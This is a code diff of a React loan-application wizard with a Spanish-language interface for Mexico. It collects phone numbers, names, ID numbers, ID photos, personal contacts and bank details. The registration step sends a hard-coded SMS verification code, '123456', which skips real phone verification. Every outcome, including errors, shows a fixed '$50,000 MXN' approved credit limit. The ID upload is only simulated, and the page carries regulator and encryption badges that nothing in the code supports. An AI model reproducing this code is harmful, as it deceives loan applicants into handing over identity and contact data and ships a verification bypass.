@@ -17,17 +17,17 @@ interface LoanApplication {
   phone?: string;
   isGuest?: boolean;
   userId?: string;
-  firstName?: string;
-  lastName?: string;
-  email?: string;
-  birthDate?: string;
+  // 第2步：身份信息
   idNumber?: string;
   realName?: string;
+  // 第4步：联系人信息
   contact1Name?: string;
   contact1Phone?: string;
   contact2Name?: string;
   contact2Phone?: string;
+  // 第7步：银行卡
   bankCardNumber?: string;
+  // 第11步：提现信息
   withdrawalAmount?: number;
   installmentPeriod?: number;
 }
@@ -40,37 +40,91 @@ interface StepProps {
   updateApplicationStep?: (step: number, stepData: any) => Promise<void>;
 }
 
-// 第1步：用户注册 - 专业金融风格
+// 第1步：用户注册
 const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, updateApplicationStep }) => {
   const { t } = useTranslation();
   const [phone, setPhone] = useState(data.phone || '');
   const [countryCode, setCountryCode] = useState('+52');
   const [showApprovedAmount, setShowApprovedAmount] = useState(false);
   const [isRegistering, setIsRegistering] = useState(false);
-  const [registrationSuccess, setRegistrationSuccess] = useState(false);
 
   const countryCodes = [
+    // 拉丁美洲国家（优先显示）
     { code: '+52', name: 'México', flag: '🇲🇽' },
     { code: '+1', name: 'Estados Unidos', flag: '🇺🇸' },
+    { code: '+1', name: 'Canadá', flag: '🇨🇦' },
     { code: '+54', name: 'Argentina', flag: '🇦🇷' },
     { code: '+55', name: 'Brasil', flag: '🇧🇷' },
     { code: '+56', name: 'Chile', flag: '🇨🇱' },
     { code: '+57', name: 'Colombia', flag: '🇨🇴' },
+    { code: '+58', name: 'Venezuela', flag: '🇻🇪' },
+    { code: '+51', name: 'Perú', flag: '🇵🇪' },
+    { code: '+593', name: 'Ecuador', flag: '🇪🇨' },
+    { code: '+591', name: 'Bolivia', flag: '🇧🇴' },
+    { code: '+595', name: 'Paraguay', flag: '🇵🇾' },
+    { code: '+598', name: 'Uruguay', flag: '🇺🇾' },
+    { code: '+506', name: 'Costa Rica', flag: '🇨🇷' },
+    { code: '+507', name: 'Panamá', flag: '🇵🇦' },
+    { code: '+503', name: 'El Salvador', flag: '🇸🇻' },
+    { code: '+502', name: 'Guatemala', flag: '🇬🇹' },
+    { code: '+504', name: 'Honduras', flag: '🇭🇳' },
+    { code: '+505', name: 'Nicaragua', flag: '🇳🇮' },
+    { code: '+53', name: 'Cuba', flag: '🇨🇺' },
+    { code: '+1', name: 'República Dominicana', flag: '🇩🇴' },
+
+    // 欧洲国家
+    { code: '+34', name: 'España', flag: '🇪🇸' },
+    { code: '+44', name: 'Reino Unido', flag: '🇬🇧' },
+    { code: '+33', name: 'Francia', flag: '🇫🇷' },
+    { code: '+49', name: 'Alemania', flag: '🇩🇪' },
+    { code: '+39', name: 'Italia', flag: '🇮🇹' },
+    { code: '+351', name: 'Portugal', flag: '🇵🇹' },
+    { code: '+31', name: 'Países Bajos', flag: '🇳🇱' },
+    { code: '+41', name: 'Suiza', flag: '🇨🇭' },
+    { code: '+43', name: 'Austria', flag: '🇦🇹' },
+    { code: '+32', name: 'Bélgica', flag: '🇧🇪' },
+
+    // 亚洲国家
+    { code: '+86', name: 'China', flag: '🇨🇳' },
+    { code: '+81', name: 'Japón', flag: '🇯🇵' },
+    { code: '+82', name: 'Corea del Sur', flag: '🇰🇷' },
+    { code: '+91', name: 'India', flag: '🇮🇳' },
+    { code: '+65', name: 'Singapur', flag: '🇸🇬' },
+    { code: '+60', name: 'Malasia', flag: '🇲🇾' },
+    { code: '+66', name: 'Tailandia', flag: '🇹🇭' },
+    { code: '+84', name: 'Vietnam', flag: '🇻🇳' },
+    { code: '+63', name: 'Filipinas', flag: '🇵🇭' },
+    { code: '+62', name: 'Indonesia', flag: '🇮🇩' },
+
+    // 其他重要国家
+    { code: '+61', name: 'Australia', flag: '🇦🇺' },
+    { code: '+64', name: 'Nueva Zelanda', flag: '🇳🇿' },
+    { code: '+27', name: 'Sudáfrica', flag: '🇿🇦' },
+    { code: '+20', name: 'Egipto', flag: '🇪🇬' },
+    { code: '+971', name: 'Emiratos Árabes Unidos', flag: '🇦🇪' },
+    { code: '+966', name: 'Arabia Saudí', flag: '🇸🇦' },
+    { code: '+972', name: 'Israel', flag: '🇮🇱' },
+    { code: '+90', name: 'Turquía', flag: '🇹🇷' },
+    { code: '+7', name: 'Rusia', flag: '🇷🇺' }
   ];
 
   const handleCheckEligibility = async () => {
-    if (!phone.trim()) return;
+    if (!phone) {
+      alert(t('errors.phoneRequired'));
+      return;
+    }
 
     const fullPhone = countryCode + phone;
     setIsRegistering(true);
 
     try {
-      // 直接领取额度并注册用户（无需验证码）
-      console.log('📱 Claiming credit limit for phone:', fullPhone);
+      // 直接进行用户注册（无需验证码）
+      console.log('📱 Registering user with phone:', fullPhone);
       
-      // 调用领取额度接口，同时完成用户注册
-      const result = await httpClient.postJson('/api/auth/claim-credit', {
+      // 调用verify-sms接口进行用户注册，使用固定验证码
+      const result = await httpClient.postJson('/api/auth/verify-sms', {
         phone: fullPhone,
+        code: '123456', // 使用固定验证码
         applicationId: data.id
       }) as { 
         success: boolean; 
@@ -78,22 +132,20 @@ const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, up
         user?: { id: string; phone: string; phone_verified: boolean };
         token?: string;
         applicationId?: string;
-        creditLimit?: number;
       };
 
-      console.log('✅ Credit claim result:', result);
+      console.log('✅ User registration result:', result);
 
-      // 无论API调用成功与否，都显示预批准金额
-      setShowApprovedAmount(true);
-      setRegistrationSuccess(true);
-      
-      if (result.success && result.user) {
-        // 用户成功注册并获得额度
+      if (result.success) {
+        // 显示审批金额
+        setShowApprovedAmount(true);
+        
+        // 用户已注册，申请已转换
         const updatedData = {
           phone: fullPhone,
           isGuest: false, // 现在是注册用户
           id: data.id,
-          userId: result.user.id
+          userId: result.user?.id
         };
         onUpdate(updatedData);
 
@@ -102,14 +154,14 @@ const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, up
             phone: fullPhone, 
             registered: true,
             verified: true,
-            userId: result.user.id,
-            creditClaimed: true
+            userId: result.user?.id
           });
         }
 
-        console.log('✅ User registered and credit claimed successfully');
+        console.log('✅ User registered successfully');
       } else {
-        // 如果API调用失败，仍然显示额度，但保持访客状态
+        // 如果注册失败，仍然显示审批金额，但保持访客状态
+        setShowApprovedAmount(true);
         const updatedData = {
           phone: fullPhone,
           isGuest: true,
@@ -121,14 +173,13 @@ const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, up
           await updateApplicationStep(1, { 
             phone: fullPhone, 
             registered: false,
-            verified: false,
-            creditClaimed: true // 前端已显示额度
+            verified: false
           });
         }
       }
     } catch (error) {
-      console.error('❌ Failed to claim credit:', error);
-      // 即使出错，也显示预批准金额，保持用户体验
+      console.error('❌ Failed to register user:', error);
+      // 如果注册失败，仍然显示审批金额，但保持访客状态
       setShowApprovedAmount(true);
       const updatedData = {
         phone: fullPhone,
@@ -141,8 +192,7 @@ const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, up
         await updateApplicationStep(1, { 
           phone: fullPhone, 
           registered: false,
-          verified: false,
-          creditClaimed: true // 前端已显示额度
+          verified: false
         });
       }
     } finally {
@@ -150,375 +200,1464 @@ const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, up
     }
   };
 
+  const handleContinue = () => {
+    onNext();
+  };
+
   return (
-    <div className="p-4 sm:p-6 lg:p-8 max-w-2xl mx-auto">
-      {/* 步骤标题 */}
-      <div className="mb-8">
-        <div className="flex items-center space-x-4 mb-6">
-          <div className="w-12 h-12 bg-slate-800 rounded-lg flex items-center justify-center shadow-sm">
-            <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
-              <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z" />
-            </svg>
-          </div>
-          <div>
-            <h2 className="text-xl font-bold text-slate-900 font-['Source_Han_Sans_CN','PingFang_SC','Microsoft_YaHei',sans-serif]">
-              Reclamar Tu Límite de Crédito
-            </h2>
-            <p className="text-sm text-slate-600 mt-1">
-              Ingresa tu número de teléfono para reclamar tu límite de crédito pre-aprobado
-            </p>
-          </div>
-        </div>
-        
-        {/* 安全认证标识 */}
-        <div className="flex flex-col sm:flex-row items-start sm:items-center space-y-2 sm:space-y-0 sm:space-x-4 p-4 bg-slate-50 border border-slate-200 rounded-lg">
-          <div className="flex items-center space-x-2">
-            <svg className="w-5 h-5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
-              <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
-            </svg>
-            <span className="text-sm font-medium text-slate-700">SSL 256-bit</span>
-          </div>
-          <div className="flex items-center space-x-2">
-            <svg className="w-5 h-5 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
-              <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
-            </svg>
-            <span className="text-sm font-medium text-slate-700">CNBV Regulado</span>
-          </div>
-          <div className="flex items-center space-x-2">
-            <svg className="w-5 h-5 text-amber-600" fill="currentColor" viewBox="0 0 20 20">
-              <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
-            </svg>
-            <span className="text-sm font-medium text-slate-700">Datos Protegidos</span>
+    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100">
+      {/* 安全认证条 */}
+      <div className="bg-slate-800 text-white py-2 px-4">
+        <div className="max-w-4xl mx-auto flex items-center justify-center text-sm">
+          <div className="flex items-center space-x-6">
+            <div className="flex items-center space-x-1">
+              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
+              </svg>
+              <span className="text-slate-300">SSL Encriptado</span>
+            </div>
+            <div className="flex items-center space-x-1">
+              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+              </svg>
+              <span className="text-slate-300">Autorizado CNBV</span>
+            </div>
+            <div className="flex items-center space-x-1">
+              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+              </svg>
+              <span className="text-slate-300">Datos Protegidos</span>
+            </div>
           </div>
         </div>
       </div>
 
-      {!showApprovedAmount ? (
-        <div className="space-y-6">
-          {/* 手机号输入区域 - 响应式优化 */}
-          <div className="space-y-3">
-            <label className="block text-sm font-semibold text-slate-800 font-['Roboto','Helvetica_Neue',Arial,sans-serif]">
-              Número de teléfono <span className="text-red-500">*</span>
-            </label>
-            
-            {/* 移动端：垂直布局，桌面端：水平布局 */}
-            <div className="flex flex-col sm:flex-row gap-3">
-              <select
-                value={countryCode}
-                onChange={(e) => setCountryCode(e.target.value)}
-                className="w-full sm:w-auto sm:min-w-[140px] px-4 py-3 border border-slate-300 rounded-sm bg-white text-sm font-['Roboto','Helvetica_Neue',Arial,sans-serif] focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-transparent"
+      <div className="container mx-auto px-4 py-8 lg:py-12">
+        <div className="max-w-2xl mx-auto">
+          {/* 主标题区域 */}
+          <div className="text-center mb-8 lg:mb-12">
+            <h1 className="text-2xl lg:text-3xl font-bold text-slate-800 mb-3">
+              ¡Préstamos con Interés Bajo!
+            </h1>
+            <p className="text-slate-600 text-base lg:text-lg leading-relaxed">
+              Ingresa tu número de teléfono para ver tu límite de crédito aprobado
+            </p>
+            <div className="mt-4 text-sm text-slate-500">
+              Su información será protegida con encriptación de grado bancario
+            </div>
+          </div>
+
+          {/* 表单卡片 */}
+          <div className="bg-white rounded-lg shadow-lg border border-slate-200 overflow-hidden">
+            <div className="p-6 lg:p-8">
+              {!showApprovedAmount ? (
+                <div className="space-y-6">
+                  {/* 手机号输入 */}
+                  <div>
+                    <label className="block text-base font-semibold text-slate-800 mb-3">
+                      {t('loanWizard.step1.phoneLabel')}
+                    </label>
+                    <div className="flex">
+                      <select
+                        value={countryCode}
+                        onChange={(e) => setCountryCode(e.target.value)}
+                        className="w-24 lg:w-28 px-3 py-4 border border-slate-300 border-r-0 bg-slate-50 text-slate-700 font-medium focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-slate-800 transition-colors"
+                        disabled={showApprovedAmount}
+                      >
+                        {countryCodes.map((country) => (
+                          <option key={country.code} value={country.code}>
+                            {country.flag} {country.code}
+                          </option>
+                        ))}
+                      </select>
+                      <input
+                        type="tel"
+                        value={phone}
+                        onChange={(e) => setPhone(e.target.value)}
+                        placeholder={t('loanWizard.step1.phonePlaceholder')}
+                        className="flex-1 px-4 py-4 border border-slate-300 text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-slate-800 transition-colors"
+                        disabled={showApprovedAmount}
+                      />
+                    </div>
+                    <div className="mt-2 text-sm text-slate-500">
+                      Verificaremos su número para procesar su solicitud
+                    </div>
+                  </div>
+
+                  {/* 提交按钮 */}
+                  <button
+                    onClick={handleCheckEligibility}
+                    disabled={!phone || isRegistering}
+                    className="w-full py-4 bg-slate-800 text-white font-semibold text-lg rounded-lg hover:bg-slate-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-lg"
+                  >
+                    {isRegistering ? (
+                      <div className="flex items-center justify-center">
+                        <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-3"></div>
+                        Procesando solicitud...
+                      </div>
+                    ) : (
+                      'Ver Mi Límite de Crédito'
+                    )}
+                  </button>
+
+                  {/* 安全提示 */}
+                  <div className="bg-slate-50 border border-slate-200 rounded-lg p-4">
+                    <div className="flex items-start space-x-3">
+                      <svg className="w-5 h-5 text-slate-600 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+                        <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
+                      </svg>
+                      <div>
+                        <h4 className="font-semibold text-slate-800 text-sm mb-1">Información Segura</h4>
+                        <p className="text-slate-600 text-sm leading-relaxed">
+                          Sus datos personales están protegidos con tecnología de encriptación SSL de 256 bits, 
+                          el mismo estándar utilizado por los bancos más importantes.
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              ) : (
+                <div className="space-y-6">
+                  {/* 结果展示 */}
+                  <div className="text-center py-6">
+                    <div className="inline-flex items-center justify-center w-16 h-16 bg-emerald-100 rounded-full mb-4">
+                      <svg className="w-8 h-8 text-emerald-600" fill="currentColor" viewBox="0 0 20 20">
+                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
+                      </svg>
+                    </div>
+                    <h3 className="text-xl font-bold text-slate-800 mb-2">
+                      ¡Felicidades! Tu límite de crédito es:
+                    </h3>
+                    <div className="text-4xl lg:text-5xl font-bold text-emerald-600 mb-2">
+                      $50,000 <span className="text-2xl lg:text-3xl text-slate-600">MXN</span>
+                    </div>
+                    <p className="text-slate-600">
+                      Préstamo con interés bajo disponible ahora
+                    </p>
+                    {!data.isGuest && data.userId && (
+                      <div className="mt-3 inline-flex items-center px-3 py-1 bg-emerald-100 text-emerald-800 text-sm font-medium rounded-full">
+                        <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
+                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
+                        </svg>
+                        Usuario registrado exitosamente
+                      </div>
+                    )}
+                  </div>
+                  
+                  {/* 优势展示 */}
+                  <div className="bg-slate-50 border border-slate-200 rounded-lg p-6">
+                    <h4 className="font-semibold text-slate-800 text-lg mb-4">Beneficios de tu préstamo:</h4>
+                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
+                      <div className="flex items-center space-x-3">
+                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
+                        <span className="text-slate-700">Tasa de interés baja: 15% OFF</span>
+                      </div>
+                      <div className="flex items-center space-x-3">
+                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
+                        <span className="text-slate-700">Hasta 100,000 pesos de crédito</span>
+                      </div>
+                      <div className="flex items-center space-x-3">
+                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
+                        <span className="text-slate-700">Sin comisión de procesamiento</span>
+                      </div>
+                      <div className="flex items-center space-x-3">
+                        <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
+                        <span className="text-slate-700">Pago anticipado sin penalización</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* 继续按钮 */}
+                  <button
+                    onClick={handleContinue}
+                    className="w-full py-4 bg-slate-800 text-white font-semibold text-lg rounded-lg hover:bg-slate-700 transition-colors shadow-lg"
+                  >
+                    Continuar con mi Solicitud
+                  </button>
+                </div>
+              )}
+            </div>
+          </div>
+
+          {/* 底部信任标识 */}
+          <div className="mt-8 text-center">
+            <div className="flex items-center justify-center space-x-8 text-sm text-slate-500">
+              <div className="flex items-center space-x-1">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                  <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                </svg>
+                <span>Regulado CNBV</span>
+              </div>
+              <div className="flex items-center space-x-1">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
+                </svg>
+                <span>Datos Seguros</span>
+              </div>
+              <div className="flex items-center space-x-1">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                  <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
+                </svg>
+                <span>Proceso Transparente</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// 第2步：身份信息
+const Step2Identity: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack, updateApplicationStep }) => {
+  const { t } = useTranslation();
+  const [idNumber, setIdNumber] = useState(data.idNumber || '');
+  const [realName, setRealName] = useState(data.realName || '');
+
+  const handleNext = () => {
+    if (!idNumber || !realName) {
+      alert(t('errors.required'));
+      return;
+    }
+    const stepData = { idNumber, realName };
+    onUpdate(stepData);
+    if (updateApplicationStep) {
+      updateApplicationStep(2, stepData);
+    }
+    onNext();
+  };
+
+  return (
+    <div className="space-y-4 sm:space-y-6">
+      <div>
+        <h3 className="text-xl sm:text-2xl font-bold mb-2">{t('loanWizard.step2.title')}</h3>
+        <p className="text-gray-600 text-sm sm:text-base">{t('loanWizard.step2.subtitle')}</p>
+      </div>
+
+      <div className="space-y-4">
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-2">
+            {t('loanWizard.step2.realNameLabel')}
+          </label>
+          <input
+            type="text"
+            value={realName}
+            onChange={(e) => setRealName(e.target.value)}
+            placeholder={t('loanWizard.step2.realNamePlaceholder')}
+            className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+            style={{ maxWidth: "100%" }}
+          />
+        </div>
+
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-2">
+            {t('loanWizard.step2.idNumberLabel')}
+          </label>
+          <input
+            type="text"
+            value={idNumber}
+            onChange={(e) => setIdNumber(e.target.value)}
+            placeholder={t('loanWizard.step2.idNumberPlaceholder')}
+            className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+            maxLength={18}
+            style={{ maxWidth: "100%" }}
+          />
+        </div>
+      </div>
+
+      <div className="flex gap-2 sm:gap-3">
+        <button
+          onClick={onBack}
+          className="px-4 sm:px-6 py-2 sm:py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 text-sm sm:text-base"
+        >
+          {t('loanWizard.step2.backButton')}
+        </button>
+        <button
+          onClick={handleNext}
+          className="px-4 sm:px-6 py-2 sm:py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm sm:text-base"
+        >
+          {t('loanWizard.step2.nextButton')}
+        </button>
+      </div>
+    </div>
+  );
+};
+
+// 第3步：身份证上传
+const Step3IdUpload: React.FC<StepProps> = ({ onNext, onBack, updateApplicationStep }) => {
+  const { t } = useTranslation();
+  const [frontUploaded, setFrontUploaded] = useState(false);
+  const [backUploaded, setBackUploaded] = useState(false);
+  const [frontUploading, setFrontUploading] = useState(false);
+  const [backUploading, setBackUploading] = useState(false);
+  const [frontFileName, setFrontFileName] = useState('');
+  const [backFileName, setBackFileName] = useState('');
+
+  const handleFileUpload = (type: 'front' | 'back', file: File) => {
+    if (type === 'front') {
+      setFrontUploading(true);
+      setFrontFileName(file.name);
+      // 模拟上传过程
+      setTimeout(() => {
+        setFrontUploading(false);
+        setFrontUploaded(true);
+        // 追踪文件上传事件
+        trackFileUpload('id_front', 1);
+      }, 2000);
+    } else {
+      setBackUploading(true);
+      setBackFileName(file.name);
+      // 模拟上传过程
+      setTimeout(() => {
+        setBackUploading(false);
+        setBackUploaded(true);
+        // 追踪文件上传事件
+        trackFileUpload('id_back', 1);
+      }, 2000);
+    }
+  };
+
+  const handleFileSelect = (type: 'front' | 'back') => {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.accept = 'image/*';
+    input.onchange = (e) => {
+      const file = (e.target as HTMLInputElement).files?.[0];
+      if (file) {
+        handleFileUpload(type, file);
+      }
+    };
+    input.click();
+  };
+
+  const handleNext = () => {
+    if (!frontUploaded || !backUploaded) {
+      alert(t('errors.required'));
+      return;
+    }
+    const stepData = { frontUploaded, backUploaded };
+    if (updateApplicationStep) {
+      updateApplicationStep(3, stepData);
+    }
+    onNext();
+  };
+
+  return (
+    <div className="space-y-6">
+      <div>
+        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step3.title')}</h3>
+        <p className="text-gray-600">{t('loanWizard.step3.subtitle')}</p>
+      </div>
+
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+        <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center">
+          <div className="space-y-4">
+            <div className="text-4xl text-gray-400">📄</div>
+            <div>
+              <h4 className="font-medium">{t('loanWizard.step3.front')}</h4>
+              <p className="text-sm text-gray-500">{t('loanWizard.step3.frontDesc')}</p>
+            </div>
+            {frontUploaded ? (
+              <div className="space-y-2">
+                <div className="text-green-600">✓ {frontFileName}</div>
+                <div className="text-xs text-gray-500">{t('loanWizard.step3.uploaded')}</div>
+              </div>
+            ) : frontUploading ? (
+              <div className="space-y-2">
+                <div className="text-blue-600">{t('loanWizard.step3.uploading')}</div>
+                <div className="w-full bg-gray-200 rounded-full h-2">
+                  <div className="bg-blue-600 h-2 rounded-full animate-pulse" style={{ width: '60%' }}></div>
+                </div>
+              </div>
+            ) : (
+              <button
+                onClick={() => handleFileSelect('front')}
+                className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
               >
-                {countryCodes.map((country) => (
-                  <option key={country.code} value={country.code}>
-                    {country.flag} {country.code}
-                  </option>
-                ))}
-              </select>
+                {t('loanWizard.step3.uploadButton')}
+              </button>
+            )}
+          </div>
+        </div>
+
+        <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center">
+          <div className="space-y-4">
+            <div className="text-4xl text-gray-400">📄</div>
+            <div>
+              <h4 className="font-medium">{t('loanWizard.step3.back')}</h4>
+              <p className="text-sm text-gray-500">{t('loanWizard.step3.backDesc')}</p>
+            </div>
+            {backUploaded ? (
+              <div className="space-y-2">
+                <div className="text-green-600">✓ {backFileName}</div>
+                <div className="text-xs text-gray-500">{t('loanWizard.step3.uploaded')}</div>
+              </div>
+            ) : backUploading ? (
+              <div className="space-y-2">
+                <div className="text-blue-600">{t('loanWizard.step3.uploading')}</div>
+                <div className="w-full bg-gray-200 rounded-full h-2">
+                  <div className="bg-blue-600 h-2 rounded-full animate-pulse" style={{ width: '60%' }}></div>
+                </div>
+              </div>
+            ) : (
+              <button
+                onClick={() => handleFileSelect('back')}
+                className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
+              >
+                {t('loanWizard.step3.uploadButton')}
+              </button>
+            )}
+          </div>
+        </div>
+      </div>
+
+      <div className="flex gap-3">
+        <button
+          onClick={onBack}
+          className="px-6 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50"
+        >
+          {t('loanWizard.step2.backButton')}
+        </button>
+        <button
+          onClick={handleNext}
+          className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700"
+        >
+          {t('loanWizard.step2.nextButton')}
+        </button>
+      </div>
+    </div>
+  );
+};
+
+// 第4步：联系人信息
+const Step4Contacts: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack, updateApplicationStep }) => {
+  const { t } = useTranslation();
+  const [contact1Name, setContact1Name] = useState(data.contact1Name || '');
+  const [contact1Phone, setContact1Phone] = useState(data.contact1Phone || '');
+  const [contact2Name, setContact2Name] = useState(data.contact2Name || '');
+  const [contact2Phone, setContact2Phone] = useState(data.contact2Phone || '');
+
+  const handleNext = () => {
+    if (!contact1Name || !contact1Phone || !contact2Name || !contact2Phone) {
+      alert(t('errors.required'));
+      return;
+    }
+    const stepData = { contact1Name, contact1Phone, contact2Name, contact2Phone };
+    onUpdate(stepData);
+    if (updateApplicationStep) {
+      updateApplicationStep(4, stepData);
+    }
+    onNext();
+  };
+
+  return (
+    <div className="space-y-6">
+      <div>
+        <h3 className="text-2xl font-bold mb-2">{t('loanWizard.step4.title')}</h3>
+        <p className="text-gray-600">{t('loanWizard.step4.subtitle')}</p>
+      </div>
+
+      <div className="space-y-6">
+        <div className="border rounded-lg p-3 sm:p-4">
+          <h4 className="font-semibold mb-3 sm:mb-4">{t('loanWizard.step4.contact1Title')}</h4>
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4">
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-2">
+                {t('loanWizard.step4.contactNameLabel')}
+              </label>
+              <input
+                type="text"
+                value={contact1Name}
+                onChange={(e) => setContact1Name(e.target.value)}
+                placeholder={t('loanWizard.step4.contactNamePlaceholder')}
+                className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                style={{ maxWidth: "100%" }}
+              />
+            </div>
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-2">
+                {t('loanWizard.step4.contactPhoneLabel')}
+              </label>
               <input
                 type="tel"
-                value={phone}
